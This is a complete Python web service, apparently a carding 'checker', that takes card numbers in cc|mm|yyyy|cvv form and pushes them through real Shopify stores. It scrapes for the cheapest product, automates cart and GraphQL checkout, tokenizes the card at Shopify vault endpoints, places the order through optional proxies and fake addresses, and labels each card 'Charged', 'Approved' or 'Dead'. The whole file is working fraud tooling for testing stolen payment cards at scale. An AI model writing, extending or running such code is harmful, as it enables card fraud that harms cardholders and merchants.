#!/usr/bin/env python3
import os
import re
import json
import time
import random
import logging
import asyncio
from urllib.parse import urlparse
from concurrent.futures import ThreadPoolExecutor

import requests
from aiohttp import web

# ═══ CONFIG ═══
HOST = os.environ.get("API_HOST", "0.0.0.0")
PORT = int(os.environ.get("API_PORT", "8080"))
WORKERS = int(os.environ.get("API_WORKERS", "20"))

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"

VAULT_ENDPOINTS = [
    "https://checkout.pci.shopifyinc.com/sessions",
    "https://deposit.us.shopifycs.com/sessions",
]

logging.basicConfig(format="%(asctime)s [%(levelname)s] %(message)s", level=logging.INFO)
log = logging.getLogger("api")


# ═══ PROXY PARSER ═══
def parse_proxy(p):
    """Return requests-compatible proxy string, or None."""
    if not p:
        return None
    p = p.strip()
    if not p:
        return None

    if p.startswith(("socks5://", "socks5h://", "socks4://", "http://", "https://")):
        return p

    if "@" in p:
        # user:pass@ip:port
        return f"http://{p}"

    parts = p.split(":")
    if len(parts) == 4:
        ip, port, user, pw = parts
        return f"http://{user}:{pw}@{ip}:{port}"
    if len(parts) == 2:
        return f"http://{p}"
    return None


# ═══ QUERIES ═══
PROPOSAL_QUERY = (
    "query Proposal($delivery:DeliveryTermsInput,$discounts:DiscountTermsInput,"
    "$payment:PaymentTermInput,$merchandise:MerchandiseTermInput,"
    "$buyerIdentity:BuyerIdentityTermInput,$taxes:TaxTermInput,"
    "$sessionInput:SessionTokenInput!,$checkpointData:String,$queueToken:String,"
    "$tip:TipTermInput,$note:NoteInput,$localizationExtension:LocalizationExtensionInput,"
    "$nonNegotiableTerms:NonNegotiableTermsInput,$scriptFingerprint:ScriptFingerprintInput,"
    "$optionalDuties:OptionalDutiesInput,$captcha:CaptchaInput){"
    "session(sessionInput:$sessionInput){"
    "negotiate(input:{"
    "purchaseProposal:{"
    "delivery:$delivery,discounts:$discounts,payment:$payment,merchandise:$merchandise,"
    "buyerIdentity:$buyerIdentity,taxes:$taxes,tip:$tip,note:$note,"
    "nonNegotiableTerms:$nonNegotiableTerms,"
    "localizationExtension:$localizationExtension,"
    "scriptFingerprint:$scriptFingerprint,"
    "optionalDuties:$optionalDuties,captcha:$captcha},"
    "checkpointData:$checkpointData,"
    "queueToken:$queueToken}){"
    "__typename "
    "result{"
    "... on NegotiationResultAvailable{"
    "checkpointData queueToken "
    "sellerProposal{"
    "__typename "
    "delivery{... on FilledDeliveryTerms{deliveryLines{id "
    "availableDeliveryStrategies{... on CompleteDeliveryStrategy{handle title __typename}__typename}"
    "__typename}__typename}__typename}"
    "payment{... on FilledPaymentTerms{availablePaymentLines{paymentMethod{"
    "... on PaymentProvider{paymentMethodIdentifier name __typename}"
    "__typename}__typename}__typename}__typename}"
    "__typename"
    "}"
    "__typename"
    "}"
    "... on CheckpointDenied{redirectUrl __typename}"
    "... on Throttled{pollAfter queueToken pollUrl __typename}"
    "... on NegotiationResultFailed{__typename}"
    "__typename"
    "}"
    "errors{code localizedMessage __typename}"
    "__typename"
    "}"
    "}"
    "}"
)

SUBMIT_QUERY = (
    "mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,"
    "$metafields:[MetafieldInput!],$postPurchaseInquiryResult:PostPurchaseInquiryResultCode,"
    "$analytics:AnalyticsInput){"
    "submitForCompletion(input:$input attemptToken:$attemptToken "
    "metafields:$metafields postPurchaseInquiryResult:$postPurchaseInquiryResult "
    "analytics:$analytics){"
    "... on SubmitSuccess{receipt{...ReceiptDetails __typename}__typename}"
    "... on SubmitAlreadyAccepted{receipt{...ReceiptDetails __typename}__typename}"
    "... on SubmitFailed{reason __typename}"
    "... on SubmitRejected{errors{... on NegotiationError{code localizedMessage nonLocalizedMessage __typename}__typename}__typename}"
    "... on Throttled{pollAfter pollUrl queueToken __typename}"
    "... on CheckpointDenied{redirectUrl __typename}"
    "... on SubmittedForCompletion{receipt{...ReceiptDetails __typename}__typename}"
    "__typename}}"
    "fragment ReceiptDetails on Receipt{"
    "... on ProcessedReceipt{id token orderIdentity{buyerIdentifier id __typename}__typename}"
    "... on ProcessingReceipt{id pollDelay __typename}"
    "... on ActionRequiredReceipt{id action{... on CompletePaymentChallenge{offsiteRedirect url __typename}__typename}__typename}"
    "... on FailedReceipt{id processingError{... on PaymentFailed{code messageUntranslated __typename}__typename}__typename}"
    "__typename}"
)

POLL_QUERY = (
    "query PollForReceipt($receiptId:ID!,$sessionToken:String!){"
    "receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){"
    "...ReceiptDetails __typename}}"
    "fragment ReceiptDetails on Receipt{"
    "... on ProcessedReceipt{id token orderIdentity{buyerIdentifier id __typename}__typename}"
    "... on ProcessingReceipt{id pollDelay __typename}"
    "... on ActionRequiredReceipt{id action{... on CompletePaymentChallenge{offsiteRedirect url __typename}__typename}__typename}"
    "... on FailedReceipt{id processingError{... on PaymentFailed{code messageUntranslated __typename}__typename}__typename}"
    "__typename}"
)


def addr():
    return {
        "address1": "123 Main St", "city": "Portland", "countryCode": "US",
        "postalCode": "04101", "firstName": "John", "lastName": "Smith",
        "zoneCode": "ME", "phone": "+12075551234",
    }


# ═══ CHECKOUT FLOW ═══
def checkout_sync(cc_raw, site_raw, proxy_raw):
    """Full checkout. Returns dict with Response/Price/Gate/Status."""
    out = {
        "Response": "Unknown Error",
        "Price": "-",
        "Gate": "Shopify Payments",
        "Status": "Dead",
        "Card": cc_raw,
        "Site": site_raw,
    }

    parts = cc_raw.split("|")
    if len(parts) != 4:
        out["Response"] = "Invalid card format"
        out["Status"] = "Site Error"
        return out

    cc, mm, yyyy, cvv = parts
    if len(yyyy) == 2:
        yyyy = "20" + yyyy

    site = re.sub(r"^https?://", "", site_raw.strip()).rstrip("/")
    proxy_url = parse_proxy(proxy_raw) if proxy_raw else None

    s = requests.Session()
    s.headers.update({"User-Agent": UA, "Accept-Language": "en-US,en;q=0.9"})
    if proxy_url:
        s.proxies.update({"http": proxy_url, "https": proxy_url})

    no_proxy_sess = requests.Session()
    no_proxy_sess.headers.update({"User-Agent": UA})

    try:
        # ── 1. Products ──
        try:
            r = s.get(f"https://{site}/products.json", timeout=15)
        except Exception as e:
            out["Response"] = f"Site Error: {type(e).__name__}"
            out["Status"] = "Site Error"
            return out

        if r.status_code != 200:
            out["Response"] = f"Site Error: HTTP {r.status_code}"
            out["Status"] = "Site Error"
            return out

        try:
            data = r.json()
        except Exception:
            out["Response"] = "Site Error: invalid products JSON"
            out["Status"] = "Site Error"
            return out

        valid = []
        for p in data.get("products", []):
            for v in p.get("variants", []):
                if not v.get("available", True):
                    continue
                try:
                    price = float(str(v.get("price", "999")).replace(",", ""))
                except Exception:
                    continue
                if 0.10 <= price <= 30:
                    valid.append({"id": v["id"], "price": price})

        if not valid:
            out["Response"] = "Failed to detect product"
            out["Status"] = "Site Error"
            return out

        valid.sort(key=lambda x: x["price"])
        vid = valid[0]["id"]
        out["Price"] = f"{valid[0]['price']:.2f}"

        # ── 2. Add to cart ──
        try:
            r = s.post(f"https://{site}/cart/add.js",
                headers={"Accept": "application/json",
                         "Content-Type": "application/x-www-form-urlencoded",
                         "Referer": f"https://{site}/",
                         "Origin": f"https://{site}"},
                data={"id": str(vid), "quantity": "1", "form_type": "product"},
                timeout=15)
            if r.status_code != 200:
                out["Response"] = f"Failed to create checkout: cart HTTP {r.status_code}"
                out["Status"] = "Site Error"
                return out
        except Exception as e:
            out["Response"] = f"Site Error: {type(e).__name__}"
            out["Status"] = "Site Error"
            return out

        # ── 3. Cart token ──
        try:
            r = s.get(f"https://{site}/cart.js", timeout=15)
            cart_token = r.json().get("token")
        except Exception:
            out["Response"] = "Site Error: no cart token"
            out["Status"] = "Site Error"
            return out

        # ── 4. Init checkout ──
        try:
            r = s.post(f"https://{site}/cart",
                headers={"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                         "Content-Type": "application/x-www-form-urlencoded",
                         "Origin": f"https://{site}",
                         "Referer": f"https://{site}/cart",
                         "Upgrade-Insecure-Requests": "1"},
                data={"checkout": "", "updates[]": "1"},
                allow_redirects=False, timeout=15)

            if r.status_code not in (301, 302, 303, 307, 308):
                out["Response"] = f"Site Error: no redirect"
                out["Status"] = "Site Error"
                return out

            loc1 = r.headers.get("location", "")
            r2 = s.get(loc1, allow_redirects=False, timeout=15)
            final_url = r2.headers.get("location", "") if r2.status_code in (301,302,303,307,308) else loc1
            r3 = s.get(final_url, timeout=25)
            html = r3.text
        except Exception as e:
            out["Response"] = f"Site Error: {type(e).__name__}"
            out["Status"] = "Site Error"
            return out

        if len(html) < 500:
            out["Response"] = "Site Error: empty checkout page"
            out["Status"] = "Site Error"
            return out

        if "captcha" in html.lower():
            out["Response"] = "captcha_required"
            out["Status"] = "Site Error"
            return out

        # Extract session token
        session_token = None
        for pat in [r'"serializedSessionToken"\s*:\s*"([^"]+)"',
                    r'"sessionToken"\s*:\s*"([^"]+)"',
                    r'serialized-sessionToken[^>]*content="&quot;([^&]+)&quot;"']:
            m = re.search(pat, html)
            if m:
                session_token = m.group(1)
                break

        if not session_token:
            out["Response"] = "Site Error: no session token"
            out["Status"] = "Site Error"
            return out

        queue_token = ""
        for pat in [r'"queueToken"\s*:\s*"([^"]+)"', r'queueToken&quot;:&quot;([^&]+)&quot;']:
            m = re.search(pat, html)
            if m:
                queue_token = m.group(1)
                break

        stable_id = ""
        for pat in [r'"stableId"\s*:\s*"([^"]+)"', r'stableId&quot;:&quot;([^&]+)&quot;']:
            m = re.search(pat, html)
            if m:
                stable_id = m.group(1)
                break

        attempt_token = ""
        m = re.search(r"/checkouts/cn/([a-zA-Z0-9]+)", final_url)
        if m:
            attempt_token = m.group(1)

        # ── 4.5 Proposal ──
        gql_url = f"https://{site}/checkouts/unstable/graphql"
        gql_headers = {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Origin": f"https://{site}",
            "Referer": f"https://{site}/",
            "X-Checkout-One-Session-Token": session_token,
            "X-Checkout-Web-Deploy-Stage": "production",
            "X-Checkout-Web-Server-Handling": "fast",
            "X-Checkout-Web-Source-Id": attempt_token,
        }

        a = addr()
        state = {"queue": queue_token, "checkpoint": None, "delivery": ""}

        def proposal_payload(handle=None):
            dv = {
                "deliveryLines": [{
                    "destination": {"streetAddress": a},
                    "targetMerchandiseLines": (
                        {"lines": [{"stableId": stable_id or "1"}]} if handle else {"any": True}),
                    "deliveryMethodTypes": ["SHIPPING"],
                    "expectedTotalPrice": {"any": True},
                    "destinationChanged": (handle is None),
                }],
                "noDeliveryRequired": [], "useProgressiveRates": False,
                "prefetchShippingRatesStrategy": None,
            }
            if handle:
                dv["deliveryLines"][0]["selectedDeliveryStrategy"] = {
                    "deliveryStrategyByHandle": {"handle": handle, "customDeliveryRate": False},
                    "options": {}}
            else:
                dv["deliveryLines"][0]["selectedDeliveryStrategy"] = {
                    "deliveryStrategyMatchingConditions": {
                        "estimatedTimeInTransit": {"any": True},
                        "shipments": {"any": True}},
                    "options": {}}

            return {
                "query": PROPOSAL_QUERY,
                "variables": {
                    "sessionInput": {"sessionToken": session_token},
                    "queueToken": state["queue"] or "",
                    "checkpointData": state["checkpoint"],
                    "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
                    "delivery": dv,
                    "merchandise": {"merchandiseLines": [{
                        "stableId": stable_id or "1",
                        "merchandise": {"productVariantReference": {
                            "id": f"gid://shopify/ProductVariantMerchandise/{vid}",
                            "variantId": f"gid://shopify/ProductVariant/{vid}",
                            "properties": [], "sellingPlanId": None, "sellingPlanDigest": None}},
                        "quantity": {"items": {"value": 1}},
                        "expectedTotalPrice": {"any": True},
                        "lineComponentsSource": None, "lineComponents": []}]},
                    "payment": {"totalAmount": {"any": True}, "paymentLines": [],
                                "billingAddress": {"streetAddress": a}},
                    "buyerIdentity": {
                        "customer": {"presentmentCurrency": "USD", "countryCode": "US"},
                        "email": "test@example.com", "emailChanged": False,
                        "phoneCountryCode": "US",
                        "marketingConsent": [{"email": {"value": "test@example.com"}}],
                        "shopPayOptInPhone": {"countryCode": "US"}, "rememberMe": False},
                    "tip": {"tipLines": []},
                    "taxes": {"proposedAllocations": None,
                        "proposedTotalAmount": {"value": {"amount": "0", "currencyCode": "USD"}},
                        "proposedTotalIncludedAmount": None,
                        "proposedMixedStateTotalAmount": None, "proposedExemptions": []},
                    "note": {"message": None, "customAttributes": []},
                    "localizationExtension": {"fields": []},
                    "nonNegotiableTerms": None,
                    "scriptFingerprint": {"signature": None, "signatureUuid": None,
                        "lineItemScriptChanges": [], "paymentScriptChanges": [],
                        "shippingScriptChanges": []},
                    "optionalDuties": {"buyerRefusesDuties": False},
                },
                "operationName": "Proposal",
            }

        for attempt in range(6):
            try:
                r = s.post(gql_url, headers=gql_headers, json=proposal_payload(), timeout=20)
                j = r.json()
            except Exception:
                time.sleep(1)
                continue

            if j.get("errors"):
                break

            negotiate = j.get("data", {}).get("session", {}).get("negotiate", {})
            result_r = negotiate.get("result", {}) or {}
            if result_r.get("__typename") != "NegotiationResultAvailable":
                time.sleep(1)
                continue

            state["queue"] = result_r.get("queueToken") or state["queue"]
            state["checkpoint"] = result_r.get("checkpointData") or state["checkpoint"]
            seller = result_r.get("sellerProposal", {}) or {}
            delivery = seller.get("delivery", {}) or {}

            if delivery.get("__typename") == "FilledDeliveryTerms":
                dl = delivery.get("deliveryLines", []) or []
                if dl:
                    strats = dl[0].get("availableDeliveryStrategies", []) or []
                    if strats:
                        state["delivery"] = strats[0].get("handle", "")
                        break
            time.sleep(1)

        if not state["delivery"]:
            out["Response"] = "Site Error: no delivery strategy"
            out["Status"] = "Site Error"
            return out

        # Call #2
        try:
            r = s.post(gql_url, headers=gql_headers, json=proposal_payload(state["delivery"]), timeout=20)
            j = r.json()
        except Exception as e:
            out["Response"] = f"Site Error: {type(e).__name__}"
            out["Status"] = "Site Error"
            return out

        negotiate = j.get("data", {}).get("session", {}).get("negotiate", {})
        result_r = negotiate.get("result", {}) or {}
        payment_method_id = ""
        if result_r.get("__typename") == "NegotiationResultAvailable":
            state["checkpoint"] = result_r.get("checkpointData") or state["checkpoint"]
            state["queue"] = result_r.get("queueToken") or state["queue"]
            seller = result_r.get("sellerProposal", {}) or {}
            pl = (seller.get("payment", {}) or {}).get("availablePaymentLines", []) or []
            if pl:
                payment_method_id = pl[0].get("paymentMethod", {}).get("paymentMethodIdentifier", "")

        if not payment_method_id:
            out["Response"] = "Site Error: no payment method"
            out["Status"] = "Site Error"
            return out

        # ── 5. Vault ──
        vault_payload = {
            "credit_card": {"number": cc, "month": int(mm), "year": int(yyyy),
                            "verification_value": cvv, "name": "John Smith"},
            "payment_session_scope": site,
        }
        payment_session_id = None
        for url in VAULT_ENDPOINTS:
            try:
                r = no_proxy_sess.post(url, json=vault_payload,
                    headers={"Content-Type": "application/json",
                             "Accept": "application/json",
                             "Origin": "https://checkout.shopifycs.com",
                             "Referer": "https://checkout.shopifycs.com/",
                             "User-Agent": UA}, timeout=15)
                if r.status_code == 200:
                    pid = r.json().get("id")
                    if pid:
                        payment_session_id = pid
                        break
            except Exception:
                pass

        if not payment_session_id:
            out["Response"] = "Failed to tokenize card"
            out["Status"] = "Site Error"
            return out

        # ── 6. Submit ──
        submit_payload = {
            "query": SUBMIT_QUERY,
            "variables": {
                "input": {
                    "checkpointData": state["checkpoint"],
                    "sessionInput": {"sessionToken": session_token},
                    "queueToken": state["queue"] or "",
                    "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
                    "delivery": {"deliveryLines": [{
                        "selectedDeliveryStrategy": {
                            "deliveryStrategyByHandle": {"handle": state["delivery"], "customDeliveryRate": False},
                            "options": {}},
                        "targetMerchandiseLines": {"lines": [{"stableId": stable_id or "1"}]},
                        "destination": {"streetAddress": a},
                        "deliveryMethodTypes": ["SHIPPING"],
                        "expectedTotalPrice": {"any": True},
                        "destinationChanged": False}],
                        "noDeliveryRequired": [], "useProgressiveRates": False},
                    "merchandise": {"merchandiseLines": [{
                        "stableId": stable_id or "1",
                        "merchandise": {"productVariantReference": {
                            "id": f"gid://shopify/ProductVariantMerchandise/{vid}",
                            "variantId": f"gid://shopify/ProductVariant/{vid}",
                            "properties": [], "sellingPlanId": None, "sellingPlanDigest": None}},
                        "quantity": {"items": {"value": 1}},
                        "expectedTotalPrice": {"any": True},
                        "lineComponentsSource": None, "lineComponents": []}]},
                    "payment": {"totalAmount": {"any": True},
                        "paymentLines": [{"paymentMethod": {"directPaymentMethod": {
                            "paymentMethodIdentifier": payment_method_id,
                            "sessionId": payment_session_id,
                            "billingAddress": {"streetAddress": a},
                            "cardSource": None}},
                            "amount": {"any": True}, "dueAt": None}],
                        "billingAddress": {"streetAddress": a}},
                    "buyerIdentity": {
                        "buyerIdentity": {"presentmentCurrency": "USD", "countryCode": "US"},
                        "contactInfoV2": {"emailOrSms": {"value": "test@example.com", "emailOrSmsChanged": False}},
                        "marketingConsent": [{"email": {"value": "test@example.com"}}],
                        "shopPayOptInPhone": {"countryCode": "US"}},
                    "tip": {"tipLines": []},
                    "taxes": {"proposedAllocations": None,
                        "proposedTotalAmount": {"value": {"amount": "0", "currencyCode": "USD"}},
                        "proposedTotalIncludedAmount": None,
                        "proposedMixedStateTotalAmount": None, "proposedExemptions": []},
                    "note": {"message": None, "customAttributes": []},
                    "localizationExtension": {"fields": []},
                    "nonNegotiableTerms": None,
                    "scriptFingerprint": {"signature": None, "signatureUuid": None,
                        "lineItemScriptChanges": [], "paymentScriptChanges": [],
                        "shippingScriptChanges": []},
                    "optionalDuties": {"buyerRefusesDuties": False},
                },
                "attemptToken": f"{attempt_token}-{random.random()}",
                "metafields": [],
                "analytics": {"requestUrl": final_url},
            },
            "operationName": "SubmitForCompletion",
        }

        try:
            r = s.post(gql_url, headers=gql_headers, json=submit_payload, timeout=25)
            j = r.json()
        except Exception as e:
            out["Response"] = f"Site Error: {type(e).__name__}"
            out["Status"] = "Site Error"
            return out

        c = j.get("data", {}).get("submitForCompletion", {})
        tn = c.get("__typename", "")
        if tn not in ("SubmitSuccess", "SubmittedForCompletion", "SubmitAlreadyAccepted"):
            errs = c.get("errors", [])
            code = errs[0].get("code") if errs else "SUBMIT_REJECTED"
            msg = errs[0].get("localizedMessage", "") if errs else ""
            out["Response"] = (msg or code)
            out["Status"] = "Dead"
            return out

        rid = (c.get("receipt", {}) or {}).get("id", "")
        if not rid:
            out["Response"] = "Site Error: no receipt"
            out["Status"] = "Site Error"
            return out

        # ── 7. Poll ──
        for _ in range(8):
            time.sleep(2)
            try:
                r = s.post(gql_url, headers=gql_headers,
                    json={"query": POLL_QUERY,
                          "variables": {"receiptId": rid, "sessionToken": session_token},
                          "operationName": "PollForReceipt"}, timeout=25)
                j = r.json()
            except Exception:
                continue

            receipt = j.get("data", {}).get("receipt", {}) or {}
            rtn = receipt.get("__typename", "")

            if rtn == "ProcessedReceipt" or "orderIdentity" in receipt:
                out["Response"] = "Order Placed 💎"
                out["Status"] = "Charged"
                out["Gate"] = "Shopify Payments"
                return out

            if rtn == "ActionRequiredReceipt":
                out["Response"] = "OTP Required (3DS)"
                out["Status"] = "Approved"
                return out

            if rtn == "FailedReceipt":
                pe = receipt.get("processingError", {}) or {}
                code = pe.get("code", "CARD_DECLINED")
                msg = pe.get("messageUntranslated", "")
                out["Response"] = (msg or code)
                if code in ("INSUFFICIENT_FUNDS", "OTP_REQUIRED"):
                    out["Status"] = "Approved"
                else:
                    out["Status"] = "Dead"
                return out

        out["Response"] = "Timeout"
        out["Status"] = "Site Error"
        return out

    except Exception as e:
        out["Response"] = f"Site Error: {type(e).__name__}: {str(e)[:80]}"
        out["Status"] = "Site Error"
        return out
    finally:
        try:
            s.close()
        except Exception:
            pass
        try:
            no_proxy_sess.close()
        except Exception:
            pass


# ═══ HTTP HANDLERS ═══
async def handle_check(request):
    cc = request.query.get("cc", "").strip()
    site = request.query.get("site", "").strip()
    proxy = request.query.get("proxy", "").strip() or None

    if not cc or not site:
        return web.json_response({
            "Response": "Missing cc or site",
            "Price": "-",
            "Gate": "UNKNOWN",
            "Status": "Site Error",
        })

    loop = asyncio.get_event_loop()
    result = await loop.run_in_executor(executor, checkout_sync, cc, site, proxy)
    return web.json_response(result)


async def handle_health(request):
    return web.json_response({
        "status": "ok",
        "service": "nomi-api",
        "workers": WORKERS,
    })


async def handle_root(request):
    return web.json_response({
        "service": "nomi-api",
        "endpoints": ["/Shopify", "/health"],
        "usage": "GET /Shopify?cc=<cc|mm|yyyy|cvv>&site=<site>&proxy=<optional>",
    })


def make_app():
    app = web.Application()
    app.router.add_get("/", handle_root)
    app.router.add_get("/health", handle_health)
    app.router.add_get("/Shopify", handle_check)
    return app


executor = ThreadPoolExecutor(max_workers=WORKERS)


if __name__ == "__main__":
    print(f"nomi-api starting on http://{HOST}:{PORT}")
    print(f"Workers: {WORKERS}")
    app = make_app()
    web.run_app(app, host=HOST, port=PORT, access_log=None, print=None)